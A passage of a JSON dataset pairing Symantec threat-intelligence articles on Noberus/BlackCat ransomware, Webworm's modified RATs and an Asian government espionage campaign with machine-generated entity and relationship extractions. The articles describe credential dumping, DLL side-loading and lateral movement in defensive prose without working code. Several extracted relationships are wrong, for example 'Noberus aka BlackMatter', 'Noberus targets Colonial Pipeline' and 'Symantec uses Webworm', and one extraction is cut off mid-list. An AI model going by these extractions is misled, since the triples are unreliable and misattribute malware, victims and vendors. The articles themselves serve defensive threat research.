      "raw_output": "Named Entities: (Witchetty, Attacker), (LookingFrog, aka), (Backdoor.Stegmap, Malware), (ProxyShell, Vulnerability), (CVE-2021-34473, Vulnerability), (CVE-2021-34523, Vulnerability), (CVE-2021-31207, Vulnerability), (ProxyLogon, Vulnerability), (CVE-2021-26855, Vulnerability), (CVE-2021-27065, Vulnerability), (ESET, Tool), (TA410, Attacker), (Cicada group, Attacker), (APT10, Attacker)\nRelationships: (Witchetty, uses, Backdoor.Stegmap), (Witchetty, uses, ProxyShell), (Witchetty, uses, ProxyLogon), (Witchetty, targets, governments), (Witchetty, targets, diplomatic missions), (Witchetty, targets, charities), (Witchetty, targets, industrial/manufacturing organizations), (Witchetty, attributedTo, TA410), (Witchetty, attributedTo, Cicada group), (Witchetty, attributedTo, APT10)",
      "entities": [
        [
          "Witchetty",
          "Attacker"
        ],
        [
          "LookingFrog",
          "aka"
        ],
        [
          "Backdoor.Stegmap",
          "Malware"
        ],
        [
          "ProxyShell",
          "Vulnerability"
        ],
        [
          "CVE-2021-34473",
          "Vulnerability"
        ],
        [
          "CVE-2021-34523",
          "Vulnerability"
        ],
        [
          "CVE-2021-31207",
          "Vulnerability"
        ],
        [
          "ProxyLogon",
          "Vulnerability"
        ],
        [
          "CVE-2021-26855",
          "Vulnerability"
        ],
        [
          "CVE-2021-27065",
          "Vulnerability"
        ],
        [
          "ESET",
          "Tool"
        ],
        [
          "TA410",
          "Attacker"
        ],
        [
          "Cicada group",
          "Attacker"
        ],
        [
          "APT10",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "Witchetty",
          "uses",
          "Backdoor.Stegmap"
        ],
        [
          "Witchetty",
          "uses",
          "ProxyShell"
        ],
        [
          "Witchetty",
          "uses",
          "ProxyLogon"
        ],
        [
          "Witchetty",
          "targets",
          "governments"
        ],
        [
          "Witchetty",
          "targets",
          "diplomatic missions"
        ],
        [
          "Witchetty",
          "targets",
          "charities"
        ],
        [
          "Witchetty",
          "targets",
          "industrial/manufacturing organizations"
        ],
        [
          "Witchetty",
          "attributedTo",
          "TA410"
        ],
        [
          "Witchetty",
          "attributedTo",
          "Cicada group"
        ],
        [
          "Witchetty",
          "attributedTo",
          "APT10"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 10
  },
  {
    "title": "noberus blackcat ransomware ttps",
    "link": "https://www.security.com/threat-intelligence/noberus-blackcat-ransomware-ttps",
    "content": "Attackers deploying the Noberus (aka BlackCat, ALPHV) ransomware have been using new tactics, tools, and procedures (TTPs) in recent months, making the threat more dangerous than ever. Among some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software. Noberus is widely believed to be a successor payload to the Darkside and BlackMatter ransomware families, which were developed by a group Symantec, byBroadcom Software, tracks as Coreid (aka FIN7, Carbon Spider). Darkside was used in theColonial Pipeline ransomware attack in May 2021. The extreme amount of public and law enforcement attention that attack attracted led Coreid to shut down Darkside and replace it with BlackMatter. Coreid runs a ransomware-as-a-service (RaaS) operation, which means it develops the ransomware but it is deployed by affiliates for a cut of the profits. The ransomware being deployed by different affiliates can sometimes explain the different TTPs and attack chains used in Noberus attacks. Noberus sparked interestwhen it was first seen in November 2021because it was coded in Rust, and this was the first time we had seen a professional ransomware strain used in real-world attacks coded in that programming language. Rust is a notable language as it is cross-platform. Coreid claims that Noberus is capable of encrypting files on Windows, EXSI, Debian, ReadyNAS, and Synology operating systems. Noberus emerged shortly after BlackMatter announced it was being retired. Coreid sets out in the rules of its affiliate program that Noberus cannot be used to attack: When announcing Noberus, Coreid underlined the features that appeared designed to emphasize its superiority to rival ransomware, including that each advert is provided with an entrance through its own unique onion domain; the affiliate program architecturally excludes all possible connections with forums; even if a full-fledged command line shell is obtained, the attacker will not be able to reveal the real IP address of the server, and encrypted negotiation chats that can only be accessed by the intended victim. The ransomware also offered two encryption algorithms (ChaCha20 and AES), as well as four encryption modes - Full, Fast, DotPattern and SmartPattern. Full is the most secure but also the slowest mode. SmartPattern offers encryption of “N” megabytes in percentage increments. By default, it encrypts with a strip of 10 megabytes every 10 percent of the file starting from the header, which would be an optimal mode for attackers in terms of speed and cryptographic strength.Sentinel Labs recently published a report where it referred to this kind of encryption as “intermittent encryption” and mentioned how it had been adopted by certain ransomware operators, including Noberus, Black Basta, and more. The percentage of each ransom that is paid to Noberus affiliates varies depending on the ransom amount. Coreid has continuously updated Noberus since its launch in November 2021 to make its operation more efficient. They will also cull affiliates if they are not bringing in enough money, encouraging them to “contact less professional teams”. In December 2021, the ransomware added a new “Plus” role for affiliates that had brought in more than $1.5 million. It gave access to: Coreid made a major update to Noberus in June 2022, which included: Coreid also made some updates to the locker, by adding new restart logic, and simplifying the Linux encryption process. In a July 2022 update the team added indexing of stolen data - meaning its data leaks websites can be searched by keyword, file type, and more. The continuous updating and refining of Noberus’ operations shows that Coreid is constantly adapting its ransomware operation to ensure it remains as effective as possible. The FBIissued a warning in April 2022 saying that between November 2021 and March 2022 at least 60 organizations worldwide had been compromisedwith the Noberus ransomware - the number of victims now is likely to be many multiples of that. In August 2022, a heavily updated version of the Exmatter (Trojan.Exmatter) data exfiltration tool was observed being used alongside Noberus in ransomware attacks. Exmatterwas discovered by Symantec researchers in November 2021 being used alongside the Blackmatter ransomware. It was designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. Even at the time of its discovery, various variants of the tool were seen, as its developers continued to refine it to optimize its operation and expedite exfiltration of a sufficient volume of high-value data in as short a time as possible. This latest version of Exmatter has reduced the number of file types it attempts to exfiltrate. It will now exfiltrate files with the following extensions only: Other new features include: In addition to this, the malware was extensively rewritten, and even existing features were implemented differently. This was possibly a bid to avoid detection. Whether Exmatter is the creation of Coreid or a skilled affiliate of the group is not clear, but its use alongside two different iterations of Coreid’s ransomware is notable. Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now. At least one affiliate of the Noberus ransomware operation was spotted in late August using information-stealing malware that is designed to steal credentials stored by Veeam backup software. Veeam is capable of storing credentials for a wide range of systems, including domain controllers and cloud services. The credentials are stored to facilitate the backup of these systems. The malware (Infostealer.Eamfo) is designed to connect to the SQL database where Veeam stores credentials, and it steal credentials with the following SQL query: Eamfo will then decrypt and display the credentials. Eamfo appears to have been in existence since at least August 2021 and there is evidence that it has previously been used by attackers using the Yanluowang and LockBit ransomware families. A recent report fromBlackBerry also detailed Eamfo being used alongside a new ransomware strain it dubbed Monti, which appears to be based on the leaked source code of the Conti ransomware. The TTPs used in Monti attacks also closely resemble former Conti attack chains, suggesting those behind Monti may be former affiliates of that group. Conti was developed by a group Symantec tracks as Miner. Stealing credentials from Veeamis a known attack techniquethat can facilitate privilege escalation and lateral movement, providing the attackers with access to more data they can potentially exfiltrate and more machines to encrypt. Noberus attacks involving Eamfo seen by Symantec also utilized GMER, a relatively old rootkit scanner that can be leveraged by ransomware actors to kill processes. GMER usage by ransomware attackers appears to have become more frequent in recent months, and it was also seen in the Monti attack detailed by BlackBerry. There’s no doubt that Coreid is one of the most dangerous and active ransomware developers operating at the moment. The group has been around since 2012, and became well-known for using its Carbanak malware to steal money from organizations worldwide, with the banking, hospitality and retail sectors among its preferred targets. Three members of the group were arrested in 2018, and in 2020 the group changed its tactics and launched its ransomware-as-a-service operation. Its continuous development of its ransomware and its affiliate programs indicates that this sophisticated and well-resourced attacker has little intention of going anywhere anytime soon. For the latest protection updates, please visit theSymantec Protection Bulletin. ad5002c8a4621efbd354d58a71427c157e4b2805cb86f434d724fc77068f1c40 – Trojan.Exmatter 8c5b108eab6a397bed4c099f13eed52aeeec37cc214423bde07544b44a62e74a – Ransom.Noberus 78517fb07ee5292da627c234b26b555413a459f8d7a9641e4a9fcc1099f06a3d –Infostealer.Eamfo 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732 –Infostealer.Eamfo df492b4cc7f644ad3e795155926d1fc8ece7327c0c5c8ea45561f24f5110ce54 –Infostealer.Eamfo 029dde7c2ec880fb3d3e95e6a8376739b4bc46a0ce24012e064b904e6ecb672c –Ransom.Noberus 72f0981f18b969db2781e874d249d8003c07f99786e217f84cf54a148de259cc –Ransom.Noberus 18c909a2b8c5e16821d6ef908f56881aa0ecceeaccb5fa1e54995935fcfd12f7 – GMER Driver e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 – GMER ed6275195cf9fd758fb7f8bce868c14dc9e9d6b7aa6f472f714bce5ed7fabf7f – Masqueraded PAExec 5799d554307906e92749a0c45f21baff28d83b1cedccbf7cb6f2b98ac1b00930 – Masqueraded PAExec The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Noberus, Malware), (BlackCat, Malware), (Exmatter, Tool), (Eamfo, Malware), (Darkside, Malware), (Coreid, Attacker), (FIN7, Attacker), (Carbon Spider, Attacker), (Colonial Pipeline, Target), (Veeam backup software, Tool), (RaaS, Technique)\nRelationships: (Noberus, aka, BlackCat), (Noberus, aka, ALPHV), (Noberus, aka, BlackMatter), (Noberus, uses, Exmatter), (Noberus, uses, Eamfo), (Noberus, exploitedBy, Darkside), (Noberus, exploitedBy, Coreid), (Noberus, exploitedBy, FIN7), (Noberus, exploitedBy, Carbon Spider), (Noberus, targets, Colonial Pipeline), (Noberus, uses, Veeam backup software), (Noberus, developedBy, Coreid), (Noberus, operatedBy, RaaS), (Noberus, writtenIn, Rust), (Noberus, encryptedFilesOn, Windows)",
      "entities": [
        [
          "Noberus",
          "Malware"
        ],
        [
          "BlackCat",
          "Malware"
        ],
        [
          "Exmatter",
          "Tool"
        ],
        [
          "Eamfo",
          "Malware"
        ],
        [
          "Darkside",
          "Malware"
        ],
        [
          "Coreid",
          "Attacker"
        ],
        [
          "FIN7",
          "Attacker"
        ],
        [
          "Carbon Spider",
          "Attacker"
        ],
        [
          "Colonial Pipeline",
          "Target"
        ],
        [
          "Veeam backup software",
          "Tool"
        ],
        [
          "RaaS",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "Noberus",
          "aka",
          "BlackCat"
        ],
        [
          "Noberus",
          "aka",
          "ALPHV"
        ],
        [
          "Noberus",
          "aka",
          "BlackMatter"
        ],
        [
          "Noberus",
          "uses",
          "Exmatter"
        ],
        [
          "Noberus",
          "uses",
          "Eamfo"
        ],
        [
          "Noberus",
          "exploitedBy",
          "Darkside"
        ],
        [
          "Noberus",
          "exploitedBy",
          "Coreid"
        ],
        [
          "Noberus",
          "exploitedBy",
          "FIN7"
        ],
        [
          "Noberus",
          "exploitedBy",
          "Carbon Spider"
        ],
        [
          "Noberus",
          "targets",
          "Colonial Pipeline"
        ],
        [
          "Noberus",
          "uses",
          "Veeam backup software"
        ],
        [
          "Noberus",
          "developedBy",
          "Coreid"
        ],
        [
          "Noberus",
          "operatedBy",
          "RaaS"
        ],
        [
          "Noberus",
          "writtenIn",
          "Rust"
        ],
        [
          "Noberus",
          "encryptedFilesOn",
          "Windows"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 15
  },
  {
    "title": "webworm espionage rats",
    "link": "https://www.security.com/threat-intelligence/webworm-espionage-rats",
    "content": "Symantec, byBroadcom Software, has gained insight into the current activities of a group we call Webworm. The group has developed customized versions of three older remote access Trojans (RATs), including Trochilus, Gh0st RAT, and 9002 RAT. At least one of the indicators of compromise (IOCs) observed by Symantec was used in an attack against an IT service provider operating in multiple Asian countries, while others appear to be in pre-deployment or testing stages. Symantec’s Webworm has links to a group dubbed Space Pirates, which was previously documented in aMay 2022 report from Positive Technologies. It is likely that the two groups are one and the same. Active since at least 2017, Webworm has been known to target government agencies and enterprises involved in IT services, aerospace, and electric power industries located in Russia, Georgia, Mongolia, and a number of other Asian countries. Previous research on the group’s activity found that it uses custom loaders hidden behind decoy documents and modified backdoors that have been around for quite some time. This corresponds with recent Webworm activity observed by Symantec. Malware used by Webworm includes versions of the following threats: First spotted back in 2015, Trochilus is a RAT implemented in C++ and its source code is available for download on GitHub. The malware has been used in targeted threat operations by multiple groups and has features that can help it evade sandbox analysis and be useful in cyber-espionage operations. The RAT’s features include, but are not limited to, the ability to remotely uninstall a file manager, and the ability to download, upload, and execute files. Trochilus has beenpreviously linkedto malware operations from threat actors also using malware such as PlugX and a variant of the 9002 RAT. The 9002 RAT appears to have been in use since at least 2009 and has historically been used by state-sponsored actors. The malware provides attackers with extensive data exfiltration capabilities. Some variants of 9002 RAT inject into memory and do not write to the disk, something that also applies to the sample analyzed by Symantec. The malware has been used in multiple campaigns by a range of actors, including in a hacking operation targeting several large corporations located in South Korea. The RAT was used to deliver additional malware, including the PlugX RAT, onto compromised machines. It has also been involved inattacks making use of zero-day exploits. While the source code for Gh0st RAT was released online in 2008, the malware has continued to be used by advanced persistent threat (APT) groups. Gh0st RAT first made headlines back in 2009, when acyber-espionage group called GhostNetused it to target diplomatic, political, economic, and military targets around the world. Symantec observed three malware droppers developed by Webworm: Analysis of one of the droppers revealed that it drops the following files: The legitimate executable Logger.exe is used to call the “LoadLibraryA” API in order to load the malicious \"[TEMP]\\logexts.dll\" file. Thelogexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON.EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode. The second stage (\"Logger.dat\") constructs the pathname of the third stage also based on its own running executable, where it combines the directory part with hardcoded \"logexts.dat\". Finally, it reads and executes the third stage. Thelogexts.dat file is obfuscated and includes several User Account Control (UAC) bypasses. It attempts to copy the previously dropped files to the following new locations: Then the file unpacks and executes in memory its backdoor payload, a variant of the Trochilus RAT (e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90). The Trochilus modifications include functionality to load its configuration from a file by checking for any of the following locations (in order of preference): The content of the configuration file is decompressed using the Lempel–Ziv–Welch (LZW) algorithm. Interestingly, one of the locations described above (“C:\\ProgramData\\resmon.resmoncfg”) is mentioned in third-party research detailing previous Space Pirates (Webworm) activity. The malware then injects svchost.exe with the ability to: Further investigation by Symantec found that droppers that share a similar structure to the one used to deploy the version of Trochilus RAT modified by Webworm were also used to deploy two additional modified versions of Gh0st RAT and 9002 RAT. Some code modifications made to the variant of Trochilus RAT were also present in the two additional retooled RATs. The additional RATs included: Changes made by Webworm to this version of 9002 RAT are apparently intended to evade detection. For example, the details of the RAT’s communication protocol, such as encryption, have also been modified by the threat actors. Gh0st RAT (BH_A006) was documented in third-party research detailing previous Webworm (Space Pirates) activity. In that research, the version of Gh0st RAT included features such as layers of obfuscation to bypass security protections and hinder analysis, network service creation, UAC bypassing, and shellcode unpacking and launching in the memory. Some of these features were also present in the version of the RAT being prepared by Webworm. Webworm’s use of customized versions of older, and in some cases open-source, malware, as well as code overlaps with the group known as Space Pirates, suggest that they may be the same threat group. However, the common use of these types of tools and the exchange of tools between groups in this region can obscure the traces of distinct threat groups, which is likely one of the reasons why this approach is adopted, another being cost, as developing sophisticated malware can be expensive in terms of both money and time. For the latest protection updates, please visit theSymantec Protection Bulletin. c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8 - Trochilus dropper 28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679 – Logger.exe a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b – logexts.dat a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef – logexts.dll 10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024 – logger.dat d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad – [RANDOM_DIGITS].doc e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90 – Trochilus RAT a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536 - Backdoor configuration 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e – Trochilus dropper 3629d2ce400ce834b1d4b7764a662757a9dc95c1ef56411a7bf38fb5470efa84 - Backdoor configuration b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646 - Trochilus dropper 824100a64c64f711b481a6f0e25812332cc70a13c98357dd26fb556683f8a7c7 – Packed backdoor The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Webworm, Attacker), (Trochilus, Malware), (GitHub, Tool), (Space Pirates, Attacker), (Positive Technologies, Company), (May 2022, Date), (IT service provider, Victim), (government agencies, Target), (IT services, Industry), (electric power industry, Industry), (Russia, Country), (Georgia, Country), (Mongolia, Country)\nRelationships: (Symantec, discoveredBy, Broadcom Software), (Symantec, uses, Webworm), (Symantec, observes, IOCs), (Symantec, linksTo, Space Pirates), (Symantec, activeSince, 2017), (Symantec, uses, Trochilus), (Symantec, contains, GitHub), (Symantec, uses, Space Pirates), (Symantec, uses, Positive Technologies), (Symantec, uses, May 2022), (Symantec, uses, IT service provider), (Symantec, uses, targeted threat operations), (Symantec, uses, multiple groups), (Symantec, uses, cyber-espionage), (Symantec, uses, C++), (Symantec, uses, GitHub), (Symantec, uses, Trochilus), (Symantec, uses, space pirates), (Symantec",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Webworm",
          "Attacker"
        ],
        [
          "Trochilus",
          "Malware"
        ],
        [
          "GitHub",
          "Tool"
        ],
        [
          "Space Pirates",
          "Attacker"
        ],
        [
          "Positive Technologies",
          "Company"
        ],
        [
          "May 2022",
          "Date"
        ],
        [
          "IT service provider",
          "Victim"
        ],
        [
          "government agencies",
          "Target"
        ],
        [
          "IT services",
          "Industry"
        ],
        [
          "electric power industry",
          "Industry"
        ],
        [
          "Russia",
          "Country"
        ],
        [
          "Georgia",
          "Country"
        ],
        [
          "Mongolia",
          "Country"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "discoveredBy",
          "Broadcom Software"
        ],
        [
          "Symantec",
          "uses",
          "Webworm"
        ],
        [
          "Symantec",
          "observes",
          "IOCs"
        ],
        [
          "Symantec",
          "linksTo",
          "Space Pirates"
        ],
        [
          "Symantec",
          "activeSince",
          "2017"
        ],
        [
          "Symantec",
          "uses",
          "Trochilus"
        ],
        [
          "Symantec",
          "contains",
          "GitHub"
        ],
        [
          "Symantec",
          "uses",
          "Space Pirates"
        ],
        [
          "Symantec",
          "uses",
          "Positive Technologies"
        ],
        [
          "Symantec",
          "uses",
          "May 2022"
        ],
        [
          "Symantec",
          "uses",
          "IT service provider"
        ],
        [
          "Symantec",
          "uses",
          "targeted threat operations"
        ],
        [
          "Symantec",
          "uses",
          "multiple groups"
        ],
        [
          "Symantec",
          "uses",
          "cyber-espionage"
        ],
        [
          "Symantec",
          "uses",
          "C++"
        ],
        [
          "Symantec",
          "uses",
          "GitHub"
        ],
        [
          "Symantec",
          "uses",
          "Trochilus"
        ],
        [
          "Symantec",
          "uses",
          "space pirates"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 18
  },
  {
    "title": "espionage asia governments",
    "link": "https://www.security.com/threat-intelligence/espionage-asia-governments",
    "content": "A distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal. The current campaign appears to be almost exclusively focused on government or public entities, including: A notable feature of these attacks is that the attackers leverage a wide range of legitimate software packages in order to load their malware payloads using a technique known as DLL side-loading. Usually, the attackers used multiple software packages in a single attack. In many cases, old and outdated versions of software are used, including security software, graphics software, and web browsers. In some cases, legitimate system files from the legacy operating system Windows XP are used. The reason for using outdated versions is that most current versions of the software used would have mitigation against side-loading built-in. DLL side-loading isa well-known techniquethat involves attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application themselves (having installed it themselves in most cases). The legitimate application then loads and executes the payload. Once a malicious DLL is loaded by the attackers, malicious code is executed, which in turn loads a .dat file. This file contains arbitrary shellcode that is used to execute a variety of payloads and associated commands in memory. In some cases, the arbitrary shellcode is encrypted. The attackers also leverage these legitimate software packages to deploy additional tools, which are used to further aid in lateral movement. These tools include credential dumping tools, a number of network scanning tools (NBTScan, TCPing, FastReverseProxy, and FScan), and the Ladon penetration testing framework. Attacks usually unfold in the following manner: In April 2022, the attackers targeted a government-owned organization in the education sector in Asia and managed to stay on its network until July. During the period of the compromise, the attackers accessed computers hosting databases and emails and eventually made their way to the domain controller. The first sign of malicious activity occurred on April 23, when a malicious command was executed via imjpuex.exe (SHA256: fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f). The file imjputyc.exe is a legitimate Windows XP file that was used by the attackers to side-load a malicious DLL file (imjputyc.dll), which in turn was used to load a .dat file (payload - imjputyc.dat). Following this activity, imjputyc.exe was used to launch a network service via svchost.exe, likely created by the malicious payload. Additionally, around the same time, the attackers leveraged Imjpuex.exe to install and execute an eleven-year-old version of Bitdefender Crash Handler (file name: javac.exe, SHA256: 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd). While Crash Handler was used for side-loading in this attack, it is just one of many old versions of applications that have been used by this group in recent months. The same Crash Handler executable was copied to CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe and executed. The attackers then installed and executed ProcDump in order to dump credentials from the Local Security Authority Server Service (LSASS): The attackers then launched several command prompts while reloading Crash Handler. This was likely done in order to install additional tools. Shortly afterwards, a file called calc.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9) appeared on the machine and was executed by the attackers. This was a renamed version of Mimikatz that the attackers then used to dump credentials: On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, apublicly available penetration testing frameworkthat is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest. On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability (CVE-2020-1472) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization’s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified). On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmdis a Microsoft command-line toolfor managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned. Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. •             SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda •             SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection. On May 19, the attackers returned to Computer #5 and used svchost to launch NetworkService. The attackers then used a variant of Mimikatz named calc.exe, which was previously used earlier in the attack (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). Mimikatz was used to dump credentials from the compromised host. On May 24, the attackers turned their attention to Computer #3, using PsExec to execute the whoami command and determine the currently logged-in user. They then ran an unknown batch file name t.bat via PsExec. It is likely the following commands were executed from this script in order to create a new user account: The script uses net.exe to check if a specific user account already exists. It then attempts to create a user account with the password Asd123.aaaa and add it to the local group on the machine. Several minutes later, the task manager was launched followed by a command prompt. The attackers then ran the following command to mount asnapshot of the active directory server. These snapshots contain sensitive information such as the active directory database (i.e. user credentials) and log files. The string c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb is the index number of the snapshot. The attackers then moved to Computer #5, where they used ProcDump (file name: p.exe, SHA256: 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424) to dump credentials from LSASS: On May 26, the attackers returned to Computer #1 and executed a file called go64.exe. This file was a copy of Fscan. The attackers ran the following command to mass scan for any machines within the compromised network (specifically a class C scan against machines in the IP range 10.72.0.0 → 10.72.0.255) with RDP services: There is also evidence that the attackers leveraged Fscan in order to perform exploit attempts against other machines on the network, including leveraging one of the ProxyLogon vulnerabilities (CVE-2021-26855) against an Exchange Server. Suspicious SMB activity also occurred around this time, suggesting the attackers may have also leveraged other exploits (likely EternalBlue) against any open SMB services. On June 6, the attackers ran PsExec on Computer #3 to launch the previously used old version of Crash Handler (file name: winnet.exe) from the %USERPROFILE%\\public\\ directory. They ran the Dnscmd utility again to enumerate all available zones, before executing winnet.exe again and a copy of Crash Handler located at APPDATA%\\t.exe to load additional malicious payloads (likely used to install ProcExplorer): Several hours later, ProcExplorer (64-bit) was launched: The last known malicious activity occurred on July 8 on Computer #3. The system hive file was dumped from the registry in order to dump user credentials. While this group of attackers was previously using ShadowPad, it has since moved on and has been deploying a range of payloads. One of the payloads used was a previously unseen, feature-rich information stealer (Infostealer.Logdatter), which appeared to be custom built. Its capabilities included: Other payloads used by the attackers included: ShadowPad is a modular RAT that was designed as a successor to the Korplug/PlugX Trojan and was, for a period of time, sold on underground forums. However, despite its origins as a publicly available tool, it has since been closely linked to espionage actors. The tool was only sold publicly for a very short period of time and it is believed that it was only sold to a handful of buyers. There is limited evidence to suggest links to past attacks involving the Korplug/PlugX malware and to attacks by a number of known groups, including Blackfly/Grayfly (APT41) and Mustang Panda. For example, the attackers leveraged a legitimate file called HPCustParticUI.exe, which was developed by HP for digital imaging applications. This previously occurred inattacks involving Korplug/Plug X. Furthermore, the attackers used a file called hpcustpartui.dll as a likely loader. The same loader was used ina long-running campaign involving Korplug/Plug X targeting the Roman Catholic Church. The current campaign uses a legitimate Bitdefender file to side-load shellcode. This same file and technique wereobserved in previous attacks linked to APT41. We have also observed the same keylogging tool deployed inprevious attacks against critical infrastructurein South East Asia. The use of legitimate applications to facilitate DLL side-loading appears to be a growing trend among espionage actors operating in the region. Although a well-known technique, it must be yielding some success for attackers given its current popularity. Organizations are encouraged to thoroughly audit software running on their networks and monitor for the presence of outliers, such as old, outdated software or packages that are not officially used by the organization. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. Legitimate applications abused for side-loading 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd – Bitdefender Crash Handler (2011) 1a95c0b8046aafa8f943bd6b68f3de550177f8df8c382f12468c4dcb416b12bc – log.dll 138c82c81ed7b84378a821074c88157c489d29d5ef66080baea88f5de0e865e6 – log.dll 704e6eb9bded6d22feab88fa81e6b0b901bee7a451a290c20527c48c235ebf52 – breakpad.dll 7a25b21df9fa93a694f15d18cd81c9f9be6fc078912924c91c645f75a5966881 – breakpad.dll 1d6aabf2114f9e6367b515d4ebfc6e104511ff4b05bd51a56fa52070c1d40e25 – breakpad.dll 5bedd1b05879b900b60a07abc57fab3075266ee7fa72385ced582699a51f1ec7 – breakpad.dll 49c23a187810edd3c16689ee1766445ec49a7221507dbe51e7b5af8ec46a91ee – breakpad.dll e51fc50defd89da446ddc0391e53ace60b016e497c5cb524fd81efdeadda056d – breakpad.dll 2237e15b094983a79f60bc1f7e962b7fb63aae75cbf5043ee636be4c8fdb9bee – Korplug b7f6cf8a6a697b254635eb0b567e2a897c7f0cefb0c0d4576326dc3f0eb09922 – Korplug 1c7e2d6ae46ff6c294885cb7936c905f328b303d6f790b66d7c4489f284c480a – QuasarRAT c3ae09887659cde70d636157c5a0efd36359efdfb2fe6a8e2cdd4e5b37528f51 – TrochilusRAT fa7eee6e322bfad1bb0487aa1275077d334f5681f0b4ede0ee784c0ec1567e01 – NBTScan d274190a347df510edf6b9a16987cea743d8df0e4c16af10787a31f0fec66da2 – NBTScan 